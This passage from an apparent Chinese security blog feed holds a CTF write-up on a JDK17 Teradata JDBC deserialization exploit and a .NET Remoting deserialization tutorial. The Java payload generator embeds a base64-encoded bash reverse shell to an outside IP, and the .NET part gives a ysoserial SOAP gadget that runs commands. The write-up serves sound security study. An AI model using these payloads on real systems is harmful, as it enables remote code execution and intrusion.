href="https://blog.wm-team.cn/index.php/archives/72/">https://blog.wm-team.cn/index.php/archives/72/</a></p><p><img src="../images/image-20240319153754054.png" alt="image-20240319153754054"></p><p><img src="../images/image-20240319153804494.png" alt="image-20240319153804494"></p><p>反序列化入口在这里   在进入到这里之前  我们得绕过两个限制</p><p><img src="../images/image-20240319153936320.png" alt="image-20240319153936320"></p><p>一个是等级一个是域名限制    </p><p><img src="../images/image-20240319154007589.png" alt="image-20240319154007589"></p><p><img src="../images/image-20240319154035790.png" alt="image-20240319154035790"></p><p>等级用整数溢出绕过</p><p>域名用sudo.cc绕过  <code>xx.sudo.cc</code>也是指向127.0.0.1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url/pal/cheat?defense=-2147483647</span><br><span class="line">url/pal/battle/flag</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240319154212483.png" alt="image-20240319154212483"></p><p>这样的话就绕过上面的两个限制了</p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><p><strong>(这里打成功一次  第二次就打不通了  不知道啥原因  md)</strong></p><p>这里本是想直接<code>BadAttributeValueExpException</code>当入口点来打的</p><p>但是BadAttr的val属性，在java8是Object类型，在jdk17中是String类型</p><p>那么我们其实就可以换成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hashmap-&gt;Xstring-&gt;Pojonode-&gt;getter</span><br><span class="line">就是将BadAttributeValueExpException换成了HashMap+Xstring</span><br></pre></td></tr></table></figure><p>还有一点就是这哥jdk17 <code>ban</code>了反射  不给我们直接用</p><p><img src="../images/image-20240320101721963.png" alt="image-20240320101721963"></p><p>原因是这个module的原因  但是我们可以在<code>configurations</code>来进行修改  这也算个trick  我们可以通过java的option开启模块，反序列化并不会检验  所以就可以不用绕这个module了</p><p><img src="../images/image-20240320104928149.png" alt="image-20240320104928149"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--add-opens java.base/java.util=ALL-UNNAMED --add-exports  java.xml/com.sun.org.apache.xpath.internal.objects=ALL-UNNAMED</span><br><span class="line"></span><br><span class="line">--add-exports java.xml/com.sun.org.apache.xpath.internal.objects=ALL-UNNAMED</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"><span class="comment">//import com.fasterxml.jackson.databind.node.POJONode;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//import com.fasterxml.jackson.databind.node.POJONode;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="comment">//import com.sun.org.apache.xpath.internal.objects.XString;</span></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.framework.AdvisedSupport;</span><br><span class="line"><span class="keyword">import</span> org.dubhe.javolution.pool.PalDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            field.set(object, value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    static &#123;</span></span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            // javassist 修改 BaseJsonNode</span></span><br><span class="line"><span class="comment">//            ClassPool classPool = ClassPool.getDefault();</span></span><br><span class="line"><span class="comment">//            CtClass ctClass = classPool.getCtClass(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);</span></span><br><span class="line"><span class="comment">//            CtMethod writeReplace = ctClass.getDeclaredMethod(&quot;writeReplace&quot;);</span></span><br><span class="line"><span class="comment">//            writeReplace.setBody(&quot;return $0;&quot;);</span></span><br><span class="line"><span class="comment">//            ctClass.writeFile();</span></span><br><span class="line"><span class="comment">//            ctClass.toClass();</span></span><br><span class="line"><span class="comment">//        &#125; catch (Exception e)&#123;</span></span><br><span class="line"><span class="comment">//            e.printStackTrace();</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException, NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuMTk5LjEwLjEwMy81NDE4NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>;</span><br><span class="line">        <span class="type">PalDataSource</span> <span class="variable">dataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PalDataSource</span>();</span><br><span class="line">        dataSource.setBROWSER(command);</span><br><span class="line">        dataSource.setLOGMECH(<span class="string">&quot;BROWSER&quot;</span>);</span><br><span class="line">        dataSource.setDSName(<span class="string">&quot;192.168.52.129&quot;</span>);</span><br><span class="line">        dataSource.setDbsPort(<span class="string">&quot;10251&quot;</span>);</span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        advisedSupport.setTarget(dataSource);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(advisedSupport);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;DataSource.class&#125;, handler);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxy);</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;xx&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>, a);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>, xString);</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>, xString);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>, a);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, map1, map1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, map2, map2, <span class="literal">null</span>));</span><br><span class="line"></span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bytes);</span><br><span class="line">        objectOutputStream.writeObject(s);</span><br><span class="line">        <span class="type">byte</span>[] output = Base64.getEncoder().encode(bytes.toByteArray());</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;guoke.ser&quot;</span>));</span><br><span class="line">        fout.write(bytes.toByteArray());</span><br><span class="line">        fout.close();</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(output));</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] input = Base64.getDecoder().decode(output);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(input);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line"><span class="comment">//        objectInputStream.readObject();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    <img src="../images/image-20240320105038907.png" alt="image-20240320105038907"></p><p>生成payload后直接打就行了</p><p><img src="../images/image-20240320105105325.png" alt="image-20240320105105325"></p><p>记得把fakeserver和fakesso给运行起来</p><p><img src="../images/image-20240320105135806.png" alt="image-20240320105135806"></p><p><img src="../images/image-20240320105142579.png" alt="image-20240320105142579"></p><p>然后就能打成功了</p><p>接着上面提到过的  为什么不直接调用<code>TeraDataSource</code>的getconnection方法   因为这里的话会调用到TeraDataSource的getParentLogger方法  导致报错  但是如果调用的是<code>PalDataSource</code>的话 因为这个类继承于TeraDataSource  然后就会调用到TeraDataSource的getconnetion方法  这样就不会报错了</p><p><strong>(因为这个PalDataSource是有参getconnect方法  会调用到TeraDataSource里的那个有参getconnect方法  如果使用TeraDataSource来打的话就会调用到其中的无参getconnect方法  导致调用到getParentLogger报错)</strong></p><p>晚点再写一下那个N1-j的那几道题  也是打jdk17的jdbc来RCE</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;因为之前再看那个绕高版本的jdk的jndi注入的时候  就有提到用jndi转JDBC来打  当时就是看看  没有实践  现在刚好这次比赛出了jdk17打JDBC的题  这里就记录一下&lt;/p&gt;
&lt;h2 id=&quot;Teradata-JDBC&quot;&gt;&lt;a href=&quot;#Teradata</summary>
      
    
    
    
    
    <category term="java" scheme="https://ke1nys.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Dotnet-Deserialization-13</title>
    <link href="https://ke1nys.github.io/posts/53ee4a5a.html"/>
    <id>https://ke1nys.github.io/posts/53ee4a5a.html</id>
    <published>2024-03-14T06:35:32.000Z</published>
    <updated>2024-04-18T12:57:04.533Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/Y4er/dotnet-deserialization/blob/main/.NET%20Remoting.md">https://github.com/Y4er/dotnet-deserialization/blob/main/.NET%20Remoting.md</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>.net remoting是一种在不同进程间传递对象的方式。假如两个不同的进程分别为服务端、客户端，客户端和服务端各自保存相同的一份对象（DLL），那么可以通过.net remoting技术来远程传递对象。拿java来讲更类似于rmi的概念。</p><p>.net remoting可以使用tcp、http、ipc协议来传输远程对象</p><h2 id="三种协议的不同"><a href="#三种协议的不同" class="headerlink" title="三种协议的不同"></a>三种协议的不同</h2><p>三种协议都位于程序集System.Runtime.Remoting.dll，命名空间分别为System.Runtime.Remoting.Channels.Http、System.Runtime.Remoting.Channels.Tcp、System.Runtime.Remoting.Channels.Ipc</p><p><img src="../images/image-20240314145028945.png" alt="image-20240314145028945"></p><p>其中不同协议用处不同：</p><ol><li>IpcChannel用于本机之间进程传输，使用ipc协议传输比HTTP、TCP速度要快的多，但是只能在本机传输，不能跨机器，本文不讲。</li><li>TcpChannel基于tcp传输，将对象进行二进制序列化之后传输二进制数据流，比http传输效率更高。</li><li>HttpChannel基于http传输，将对象进行soap序列化之后在网络中传输xml，兼容性更强。</li></ol><h2 id="net-remoting"><a href="#net-remoting" class="headerlink" title=".net remoting"></a>.net remoting</h2><p>先来以HttpChannel为例看一个demo了解.net remoting。需要三个项目，分别是</p><ol><li>RemoteDemoClient</li><li>RemoteDemoServer</li><li>RemoteDemoObject</li></ol><p>分别表示<strong>客户端</strong>、<strong>服务端</strong>和<strong>要传输的对象</strong>。</p><h2 id="RemoteDemoObject-传输对象类"><a href="#RemoteDemoObject-传输对象类" class="headerlink" title="RemoteDemoObject(传输对象类)"></a>RemoteDemoObject(传输对象类)</h2><p>RemoteDemoObject.RemoteDemoObjectClass需要继承MarshalByRefObject类才能跨域（AppDomain）远程传输。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Remoting.Metadata;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">RemoteDemoObject</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">RemoteDemoObjectClass</span> : <span class="title">MarshalByRefObject</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> count = <span class="number">0</span>;</span><br><span class="line">        [<span class="meta">SoapMethod(XmlNamespace = <span class="string">&quot;RemoteDemoObject1&quot;</span>, SoapAction = <span class="string">&quot;RemoteDemoObject#GetCount&quot;</span>)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">int</span> <span class="title">GetCount</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(<span class="string">&quot;GetCount called.&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里在客户端和服务端的必须加上这个<code>SoapMethod</code>  不然会报错</p><p><img src="../images/image-20240314165435864.png" alt="image-20240314165435864"></p><p><a href="https://blog.csdn.net/sloder/article/details/8694560">https://blog.csdn.net/sloder/article/details/8694560</a></p><h2 id="RemoteDemoServer-服务端"><a href="#RemoteDemoServer-服务端" class="headerlink" title="RemoteDemoServer(服务端)"></a>RemoteDemoServer(服务端)</h2><p>服务端注册HttpServerChannel并绑定在9999端口，然后<code>RemotingConfiguration.RegisterWellKnownServiceType</code>发布uri地址为RemoteDemoObjectClass.rem的远程调用对象，类型是RemoteDemoObjectClass。    </p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Remoting;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Remoting.Channels;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Remoting.Channels.Http;</span><br><span class="line"><span class="keyword">using</span> RemoteDemoObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">RemoteDemoServer</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            HttpServerChannel httpServerChannel = <span class="keyword">new</span> HttpServerChannel(<span class="number">9999</span>);</span><br><span class="line">            ChannelServices.RegisterChannel(httpServerChannel, <span class="literal">false</span>);</span><br><span class="line">            RemotingConfiguration.RegisterWellKnownServiceType(<span class="keyword">typeof</span>(RemoteDemoObjectClass), <span class="string">&quot;RemoteDemoObjectClass.rem&quot;</span>, WellKnownObjectMode.Singleton);</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(<span class="string">&quot;server has been start&quot;</span>);</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>WellKnownObjectMode.Singleton</code>这个东西没啥用  不注意就行了</p><h2 id="RemoteDemoClient-客户端"><a href="#RemoteDemoClient-客户端" class="headerlink" title="RemoteDemoClient(客户端)"></a>RemoteDemoClient(客户端)</h2><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> RemoteDemoObject;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">RemoteDemoClient</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> serverAddress = <span class="string">&quot;http://localhost:9999/RemoteDemoObjectClass.rem&quot;</span>;</span><br><span class="line">            RemoteDemoObjectClass obj1 = (RemoteDemoObjectClass)Activator.GetObject(<span class="keyword">typeof</span>(RemoteDemoObjectClass), serverAddress);</span><br><span class="line"></span><br><span class="line">            Console.WriteLine(<span class="string">&quot;call GetCount() get return value:&#123;0&#125;&quot;</span>,obj1.GetCount());</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读取远程地址  然后获取其对象  然后执行其里面的GetCount函数</p><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>服务端</p><p><img src="../images/image-20240315101447980.png" alt="image-20240315101447980"></p><p>客户端</p><p><img src="../images/image-20240315101458308.png" alt="image-20240315101458308"></p><h2 id="HttpServerChannel数据包"><a href="#HttpServerChannel数据包" class="headerlink" title="HttpServerChannel数据包"></a>HttpServerChannel数据包</h2><p>先使用bp来修改代理</p><p><img src="../images/image-20240315110035354.png" alt="image-20240315110035354"></p><p>然后修改Client的代码   将原本9999端口改为8080端口</p><p><img src="../images/image-20240315110236767.png" alt="image-20240315110236767"></p><p><img src="../images/image-20240315110317840.png" alt="image-20240315110317840"></p><p>一看就是将数据进行soap序列化然后再进行传输</p><p>跟进代码进行分析</p><p><img src="../images/image-20240315110413176.png" alt="image-20240315110413176"></p><p>跟进HttpServerChannel类</p><p><img src="../images/image-20240315110437774.png" alt="image-20240315110437774"></p><p>跟进SetupChannel函数</p><p><img src="../images/image-20240315110506975.png" alt="image-20240315110506975"></p><p>在判断sinkProvider参数为空的情况下  我们跟进这个CreateDefaultServerProviderChain函数</p><p><img src="../images/image-20240315110559136.png" alt="image-20240315110559136"></p><p><img src="../images/image-20240315110700515.png" alt="image-20240315110700515"></p><p>发现这里使用了一个Provider链，从SdlChannelSinkProvider-&gt;SoapServerFormatterSinkProvider-&gt;BinaryServerFormatterSinkProvider</p><p><strong>而TcpServerChannel中，使用的是BinaryServerFormatterSinkProvider-&gt;SoapServerFormatterSinkProvider</strong></p><p>由此可见http使用soap协议进行序列化，tcp使用binary进行序列化。</p><h3 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h3><p>我们再抓包的时候  发现了其实将类进行soap序列化之后进行传输的  如果我们修改传输的内容  是不是就可以RCE了？</p><p>yso生成poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ysoserial.exe -f soapformatter -g TextFormattingRunProperties -c calc</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;SOAP-ENV:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:clr=&quot;http://schemas.microsoft.com/soap/encoding/clr/1.0&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line">&lt;SOAP-ENV:Body&gt;</span><br><span class="line">&lt;a1:TextFormattingRunProperties id=&quot;ref-1&quot; xmlns:a1=&quot;http://schemas.microsoft.com/clr/nsassem/Microsoft.VisualStudio.Text.Formatting/Microsoft.PowerShell.Editor%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35&quot;&gt;</span><br><span class="line">&lt;ForegroundBrush id=&quot;ref-3&quot;&gt;&amp;#60;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;utf-16&amp;#34;?&amp;#62;</span><br><span class="line">&amp;#60;ObjectDataProvider MethodName=&amp;#34;Start&amp;#34; IsInitialLoadEnabled=&amp;#34;False&amp;#34; xmlns=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&amp;#34; xmlns:sd=&amp;#34;clr-namespace:System.Diagnostics;assembly=System&amp;#34; xmlns:x=&amp;#34;http://schemas.microsoft.com/winfx/2006/xaml&amp;#34;&amp;#62;</span><br><span class="line">  &amp;#60;ObjectDataProvider.ObjectInstance&amp;#62;</span><br><span class="line">    &amp;#60;sd:Process&amp;#62;</span><br><span class="line">      &amp;#60;sd:Process.StartInfo&amp;#62;</span><br><span class="line">        &amp;#60;sd:ProcessStartInfo Arguments=&amp;#34;/c calc&amp;#34; StandardErrorEncoding=&amp;#34;&#123;x:Null&#125;&amp;#34; StandardOutputEncoding=&amp;#34;&#123;x:Null&#125;&amp;#34; UserName=&amp;#34;&amp;#34; Password=&amp;#34;&#123;x:Null&#125;&amp;#34; Domain=&amp;#34;&amp;#34; LoadUserProfile=&amp;#34;False&amp;#34; FileName=&amp;#34;cmd&amp;#34; /&amp;#62;</span><br><span class="line">      &amp;#60;/sd:Process.StartInfo&amp;#62;</span><br><span class="line">    &amp;#60;/sd:Process&amp;#62;</span><br><span class="line">  &amp;#60;/ObjectDataProvider.ObjectInstance&amp;#62;</span><br><span class="line">&amp;#60;/ObjectDataProvider&amp;#62;&lt;/ForegroundBrush&gt;</span><br><span class="line">&lt;/a1:TextFormattingRunProperties&gt;</span><br><span class="line">&lt;/SOAP-ENV:Body&gt;</span><br><span class="line">&lt;/SOAP-ENV:Envelope&gt;</span><br></pre></td></tr></table></figure><p>将<code>&lt;/SOAP-ENV:Body&gt;</code>标签去掉的时候  直接放入包中就行了</p><p><img src="../images/image-20240315111248404.png" alt="image-20240315111248404"></p><p>当我们直接修改发包的时候  发现并没有弹出计算器  这里的原因就是客户端不会反序列化我们传入的类  因为不是其指定的类   这里就涉及到了这个<strong>TypeFilterLevel</strong>参数了</p><p>在上文中我们提到SoapServerFormatterSinkProvider和BinaryServerFormatterSinkProvider，这两个类都有一个重要的属性<strong>TypeFilterLevel</strong>，<a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.runtime.serialization.formatters.typefilterlevel?view=net-5.0">根据文档</a>可知其是枚举类型。</p><p><img src="../images/image-20240315111429821.png" alt="image-20240315111429821"></p><p>那么我们将其设置为Full的时候  应该就能反序列化成功了</p><p><strong>修改Server端代码</strong></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 